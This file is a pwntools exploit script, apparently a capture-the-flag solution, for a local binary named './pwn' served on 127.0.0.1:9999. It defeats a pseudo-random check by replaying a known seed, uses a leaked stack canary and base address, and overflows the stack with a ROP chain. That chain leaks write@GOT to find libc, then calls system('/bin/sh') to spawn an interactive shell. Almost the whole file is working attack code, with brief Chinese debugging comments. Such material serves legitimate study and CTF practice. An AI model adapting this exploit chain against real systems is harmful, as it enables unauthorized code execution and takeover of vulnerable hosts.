from pwn import *
from ctypes import cdll

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux', 'splitw', '-h']

lc = "./pwn"
libc_dll = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

elf = ELF(lc)
libc = ELF("./libc.so.6")

#p = process(lc)
#p = gdb.debug(lc, "break vuln")
p = remote("127.0.0.1", 9999)

# 此处使用seed可以破解伪随机（也可以手动输出寄存器值得到实际随机值）
seed = 33550336
libc_dll.srand(seed)
rand = libc_dll.rand()
print(f"random v0: {rand}")


p.sendline("-1")
p.sendline(f"{rand}")

p.recvuntil(b"gift for you!\n")
p.recv(1)
canary = int(p.recvline().strip(), 16)
base_addr = int(p.recvline().strip(), 16)

print(f"Canary leaked: {hex(canary)}")
print(f"Base address leaked: {hex(base_addr)}")

write_got = elf.got["write"] + base_addr
write_libc = libc.sym["write"]

print(f"write.got find: {hex(write_got)}")

padding = 0x68 

#pop_rsi = 0x13c5 + base_addr # ROPgadget自查，发现rbp会异常变0x0，怀疑是rbp没push rbp导致的错位
pop_rdi = 0x13fe + base_addr 
pop_rsi = 0x13c5 + base_addr
pop_rdx = 0x13c7 + base_addr
ret = 0x101a + base_addr

#vuln_addr_after_pop_rdi = 0x1373 + base_addr
vuln_read = 0x134d + base_addr
write_plt = elf.plt["write"] + base_addr
#read_plt = elf.plt["read"] + base_addr

payload1 = padding * b"a" + (p64(canary) + p64(0)) 
#payload1 = payload1 + p64(ret)

payload1 += p64(pop_rsi) + p64(write_got) 
payload1 += p64(pop_rdx) + p64(8)
payload1 += p64(pop_rdi) + p64(1)
#payload1 += p64(vuln_addr_after_pop_rdi) 由于栈对齐一直存在问题，选择直接跳write函数泄露，再回跳vuln函数
payload1 += p64(write_plt)
payload1 += p64(vuln_read)

#debug("./input.dat", rand, payload1)
p.recvuntil("smashing happily!\n")
p.sendline(payload1)

write_sym = u64(p.recv(8))
libc_base = write_sym - write_libc# recv write -> libc_base

sys = libc.sym["system"] + libc_base
bin_sh = next(libc.search(b"/bin/sh")) + libc_base

pop_rdi = libc_base + 0x2a3e5 # ROPgadget自查libc文件

print(f"write symbol leaked: {hex(write_sym)}")
print(f"libc base address calculated: {hex(libc_base)}")
print(f"system function found: {hex(sys)}")
print(f"pop rdi gadget found: {hex(pop_rdi)}")
print(f"\'/bin/sh\' string found: {hex(bin_sh)}")

p.recvuntil("smashing happily!\n")

payload2 = padding * b'a' + (p64(canary) + p64(0))
payload2 += p64(ret) 
payload2 += p64(pop_rdi) + p64(bin_sh) + p64(sys)

p.sendline(payload2)

p.interactive()
